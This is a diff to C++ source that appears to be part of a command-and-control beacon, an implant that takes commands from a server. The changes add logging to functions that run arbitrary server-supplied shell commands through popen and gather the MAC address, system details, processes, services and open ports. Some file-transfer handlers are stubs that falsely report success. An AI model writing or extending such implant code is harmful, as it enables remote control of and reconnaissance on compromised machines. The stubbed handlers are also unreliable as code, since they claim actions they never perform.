@@ -12,33 +12,38 @@
 #include <unistd.h>
 #include <cstring>
 
+#include "../../Generic/logging.hpp"   
 
 std::string executeShellCommand(const char* cmd) {
+    logger(std::string("Executing shell command: " + std::string(cmd)));
     std::array<char, 2048> buffer;
     std::string result;
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
     if (!pipe) {
+        log_error("popen() failed!");
         throw std::runtime_error("popen() failed!");
     }
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
         result += buffer.data();
     }
+    logger("Shell command executed successfully.");
     return result;
 }
 
 std::string getMacAddress() {
-    int fd;
-    struct ifreq ifr;
-    char iface[] = "eth0"; // Change this to the appropriate network interface
-
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    char iface[] = "eth0";
+    logger(std::string("Retrieving MAC address for interface: ") + iface);
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) {
+        log_error("socket() failed while retrieving MAC address");
         perror("socket");
         return "Error retrieving MAC address";
     }
 
+    struct ifreq ifr;
     strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
+        log_error("ioctl() failed while retrieving MAC address");
         perror("ioctl");
         close(fd);
         return "Error retrieving MAC address";
@@ -51,14 +56,17 @@ std::string getMacAddress() {
     snprintf(mac_address, sizeof(mac_address), "%02x:%02x:%02x:%02x:%02x:%02x",
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
+    logger("MAC address successfully retrieved.");
     return std::string(mac_address);
 }
 
 std::string getSystemInfo() {
+    logger("Retrieving system information.");
     std::stringstream ss;
 
     struct utsname uname_info;
     if (uname(&uname_info) != 0) {
+        log_error("uname() call failed");
         perror("uname");
         return "Error retrieving system info";
     }
@@ -73,53 +81,68 @@ std::string getSystemInfo() {
        << "mac-address = " << mac_address << "\n"
        << "processor = " << uname_info.machine << "\n";
 
+    logger("System information retrieved successfully.");
     return ss.str();
 }
 
 std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
+    logger(std::string("Handling command: ") + command + " with UUID: " + uuid);
+    
     if (command == "shutdown") {
+        logger("shutdown command received.");
         // Implement shutdown logic
         return "Not implemented.";
     } else if (command == "switch_beacon") {
-
+        logger("switch_beacon command received.");
         return "Not Implemented";
     } else if (command == "shell") { // need to check if it starts with shell, limitation of current beacon on server
+        logger("shell command received with command_data: " + command_data);
         std::string output = executeShellCommand(command_data.c_str());
         std::cout << "Shell command output: " << output << std::endl;
         return output;
     } else if (command == "list_processes") {
+        logger("list_processes command received.");
         std::string output = executeShellCommand("ps aux");
         return output;
     } else if (command == "systeminfo") {
+        logger("systeminfo command received.");
         std::string output = getSystemInfo();
         return output;
     } else if (command == "checkfiles") {
+        logger("checkfiles command received.");
         // Implement checkfiles logic
         // Example: verify integrity of specific files
         return "File check completed.";
     } else if (command == "send_file") {
+        logger("send_file command received.");
         // Implement send_file logic
         return "File sent successfully.";
     } else if (command == "recv_file") {
+        logger("recv_file command received.");
         // Implement recv_file logic
         return "File received successfully.";
     } else if (command == "list_services") {
+        logger("list_services command received.");
         // Implement list_services logic
         std::string output = executeShellCommand("service --status-all");
         return output;
     } else if (command == "disk_usage") {
+        logger("disk_usage command received.");
         // Implement disk_usage logic
         std::string output = executeShellCommand("df -h");
         return output;
     } else if (command == "netstat") {
+        logger("netstat command received.");
         // Implement netstat logic
         std::string output = executeShellCommand("netstat -tuln");
         return output;
     } else if (command == "list_dir") {
+        logger("list_dir command received.");
         // Implement list_dir logic
         std::string output = executeShellCommand("ls -la");
         return output;
     } else {
+        log_error(std::string("Unknown command received: ") + command);
         std::cerr << "Unknown command: " << command << std::endl;
     }
     return "not a supported command";
